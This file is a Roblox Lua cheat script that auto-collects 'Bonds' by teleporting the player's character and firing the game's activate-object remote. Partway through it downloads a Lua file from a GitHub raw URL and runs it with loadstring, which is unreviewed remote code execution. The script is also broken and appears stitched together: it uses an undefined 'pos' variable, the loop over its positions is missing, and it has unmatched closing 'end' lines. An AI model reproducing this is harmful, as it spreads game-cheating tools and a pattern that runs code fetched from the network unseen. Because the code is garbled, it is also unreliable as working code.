local positions = {
    Vector3.new(57, 3, 30000), Vector3.new(57, 3, 28000),
    Vector3.new(57, 3, 26000), Vector3.new(57, 3, 24000),
    Vector3.new(57, 3, 22000), Vector3.new(57, 3, 20000),
    Vector3.new(57, 3, 18000), Vector3.new(57, 3, 16000),
    Vector3.new(57, 3, 14000), Vector3.new(57, 3, 12000),
    Vector3.new(57, 3, 10000), Vector3.new(57, 3, 8000),
    Vector3.new(57, 3, 6000), Vector3.new(57, 3, 4000),
    Vector3.new(57, 3, 2000), Vector3.new(57, 3, 0),
    Vector3.new(57, 3, -2000), Vector3.new(57, 3, -4000),
    Vector3.new(57, 3, -6000), Vector3.new(57, 3, -8000),
    Vector3.new(57, 3, -10000), Vector3.new(57, 3, -12000),
    Vector3.new(57, 3, -14000), Vector3.new(57, 3, -16000),
    Vector3.new(57, 3, -18000), Vector3.new(57, 3, -20000),
    Vector3.new(57, 3, -22000), Vector3.new(57, 3, -24000),
    Vector3.new(57, 3, -26000), Vector3.new(57, 3, -28000),
    Vector3.new(57, 3, -30000), Vector3.new(57, 3, -32000),
    Vector3.new(57, 3, -34000), Vector3.new(57, 3, -36000),
    Vector3.new(57, 3, -38000), Vector3.new(57, 3, -40000),
    Vector3.new(57, 3, -42000), Vector3.new(57, 3, -44000),
    Vector3.new(57, 3, -46000), Vector3.new(57, 3, -48000),
    Vector3.new(57, 3, -49032), Vector3.new(-424, 3, -49032)
}

local duration = 0.5
local bondPauseDuration = 0.5

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

-- GUI Setup (Includes Timer)
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:FindFirstChildOfClass("PlayerGui")

local bondCounter = Instance.new("TextLabel")
bondCounter.Size = UDim2.new(0.3, 0, 0.1, 0)
bondCounter.Position = UDim2.new(0.5, 0, 0.7, 0)
bondCounter.AnchorPoint = Vector2.new(0.5, 0.5)
bondCounter.BackgroundTransparency = 0.5
bondCounter.TextScaled = true
bondCounter.Font = Enum.Font.SourceSansBold
bondCounter.TextColor3 = Color3.fromRGB(255, 255, 255)
bondCounter.Text = "Bonds Found: 0"
bondCounter.Parent = screenGui

-- **Live Timer GUI**
local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(0.2, 0, 0.05, 0)
timerLabel.Position = UDim2.new(0.5, 0, 0.8, 0)
timerLabel.AnchorPoint = Vector2.new(0.5, 0.5)
timerLabel.BackgroundTransparency = 0.5
timerLabel.TextScaled = true
timerLabel.Font = Enum.Font.SourceSansBold
timerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
timerLabel.Text = "Time: 0s"
timerLabel.Parent = screenGui

-- Start time tracking
local startTime = tick()

task.spawn(function()
    while true do
        task.wait(1)
        local elapsedTime = math.floor(tick() - startTime)
        timerLabel.Text = "Time: " .. elapsedTime .. "s"
    end
end)

task.spawn(function()
    task.wait(120)
    screenGui:Destroy()
end)

local foundBonds = {} -- Stores bonds that have been collected
local bondCount = 0

local function updateBondCount()
    bondCounter.Text = "Bonds Found: " .. tostring(bondCount)
end

local function safeTeleport(position)
    pcall(function()
        task.spawn(function() -- Stream while teleporting instead of waiting
            game.Players.LocalPlayer:RequestStreamAroundAsync(position)
        end)
        task.wait(0.5) -- Lowered streaming delay
        hrp.CFrame = CFrame.new(position) -- Teleport after streaming
    end)
end

-- **Updated Bond Collection Function**
local function collectAllBonds()
    local bonds = workspace.RuntimeItems:GetChildren()
    local visitedPositions = {}

    for _, bond in ipairs(bonds) do
        if bond:IsA("Model") and bond.PrimaryPart and (bond.Name == "Bond" or bond.Name == "Bonds") then
            local bondPos = bond.PrimaryPart.Position

            -- **Only teleport if the Bond hasn't been collected yet**
            if not foundBonds[bondPos] then
                foundBonds[bondPos] = true -- Mark Bond as collected
                table.insert(visitedPositions, bondPos)
            end
        end
    end

    -- **Teleport only to Bonds that still exist**
    for _, bondPos in ipairs(visitedPositions) do
        local bondStillExists = false

        -- Check if the Bond still exists in `workspace.RuntimeItems`
        for _, bond in ipairs(workspace.RuntimeItems:GetChildren()) do
            if bond:IsA("Model") and bond.PrimaryPart and bond.PrimaryPart.Position == bondPos then
                bondStillExists = true
                break
            end
        end

        if bondStillExists then
            safeTeleport(bondPos)
            print("Bond found! Teleporting to " .. tostring(bondPos))
            task.wait(bondPauseDuration)
        else
            print("Skipped deleted Bond at: " .. tostring(bondPos))
        end
    end
end

if pos == Vector3.new(-424, 3, -49032) then
    print("Final position reached! Searching for nearby Bonds...")

    local function findClosestBond()
        local items = workspace:WaitForChild("RuntimeItems"):GetChildren()
        local closestBond, closestDist = nil, math.huge

        for _, bond in ipairs(items) do
            if bond:IsA("Model") and bond.PrimaryPart then
                local dist = (bond.PrimaryPart.Position - hrp.Position).Magnitude
                if dist < closestDist then
                    closestBond = bond.PrimaryPart.Position
                    closestDist = dist
                end
            end
        end

        return closestBond
    end

    local function remainingBonds()
        local count = 0
        for _, bond in ipairs(workspace.RuntimeItems:GetChildren()) do
            if bond:IsA("Model") and bond.PrimaryPart then
                count += 1
            end
        end
        return count
    end

    -- ✅ **Loop until all Bonds are collected before moving forward**
    repeat
        local bondPos = findClosestBond()
        if bondPos then
            print("Teleporting to closest Bond at:", bondPos)
            safeTeleport(bondPos)
            task.wait(bondPauseDuration)
            collectAllBonds()
            updateBondCount()
        end
    until remainingBonds() == 0 -- ✅ **Ensures NO Bonds are left before continuing**

    print("All Bonds collected. Resuming normal teleportation.")
end


        -- Loadstring execution when reaching (57, 3, -49032)
        if pos == Vector3.new(57, 3, -49032) then
            print("Reached final position, waiting 15 seconds...")
            task.wait(15)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
            print("Executed loadstring after 15 seconds.")
        end

        -- Normal teleportation after Bond collection
        collectAllBonds()
        updateBondCount()
    end
end)



task.spawn(function()
    task.wait(2)

    while true do
        task.wait(0.1)

        local items = game.Workspace:WaitForChild("RuntimeItems")

        for _, bond in pairs(items:GetChildren()) do
            if bond:IsA("Model") and bond.Name == "Bond" and bond.PrimaryPart then
                local dist = (bond.PrimaryPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                
                if dist < 100 then
                    -- **Parallel Bond Collection**
                    task.spawn(function() 
                        game:GetService("ReplicatedStorage"):WaitForChild("Shared")
                        :WaitForChild("Network"):WaitForChild("RemotePromise")
                        :WaitForChild("Remotes"):WaitForChild("C_ActivateObject")
                        :FireServer(bond)
                        print("Bond collected:", bond.Name)
                        
                        -- **Immediately mark Bond as collected**
                        foundBonds[bond.PrimaryPart.Position] = nil
                    end)
                end
            else
                warn("PrimaryPart missing or object name mismatch for Bond!")
            end
        end
    end
end)


